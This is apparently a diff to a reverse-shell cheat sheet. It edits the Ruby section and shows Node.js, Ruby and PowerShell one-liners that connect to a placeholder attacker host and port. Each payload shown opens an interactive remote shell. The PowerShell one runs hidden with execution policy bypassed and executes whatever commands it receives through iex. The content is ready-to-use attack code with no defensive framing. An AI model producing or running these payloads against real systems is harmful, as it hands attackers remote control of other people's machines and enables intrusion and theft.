@@ -138,12 +138,8 @@ x('child_process').exec('nc xxx yyy -e /bin/bash')
 ╚═══════════════════════════════════════════════════
 
 ╔RUBY═══════════════════════════════════════════════
-║ ruby -rsocket -e'f=TCPSocket.open("xxx",yyy).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-╠══════════════╦════════════════════════════════════
-║ Windows only ║ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-╠══════════════╬════════════════════════════════════
-║ Windows only ║ ruby -rsocket -e 'c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-╚══════════════╩════════════════════════════════════
+║ ruby -rsocket -e 'c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+╚═══════════════════════════════════════════════════
 
 ╔POWERSHELL═════════════════════════════════════════
 ║ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("xxx",yyy);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
